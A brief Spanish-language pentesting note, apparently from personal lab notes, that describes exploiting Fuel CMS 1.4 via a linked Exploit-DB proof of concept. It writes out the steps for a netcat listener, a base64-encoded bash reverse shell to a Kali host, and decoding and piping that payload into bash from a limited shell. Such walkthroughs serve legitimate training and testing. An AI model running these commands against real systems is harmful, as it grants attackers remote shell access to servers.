# Fuel CMS 

Tags: #FuelCMS 

**Fuel CMS** es un sistema para crear y administrar sitios web, construido sobre **CodeIgniter**, un framework de PHP. Permite editar páginas y contenido desde un panel de administración.
## Version 1.4
* [PoC](https://www.exploit-db.com/exploits/50477)
```bash 
Paso 1:
# Obtener una shell limitada que llama a la función system()
❯ python3 fuel.py -u hyyp://IP  
```

```bash 
Paso 2:
❯ rlwrap nc -nlvp 4444   

Paso 3:
# El problema de esta shell limitada es que el script hace system() internamente — no maneja bien procesos que toman control del stdin/stdout como un reverse shell interactivo. Por lo que la mejor opción para obtener otra revershell es la siguiente:

# Desde Kali 
❯ echo 'bash -i >& /dev/tcp/IP_Kali/4444 0>&1' | base64

Paso 4:
# Dentro de la shell limitada ejecutar 
❯ echo BASE64AQUI|base64 -d|bash  
```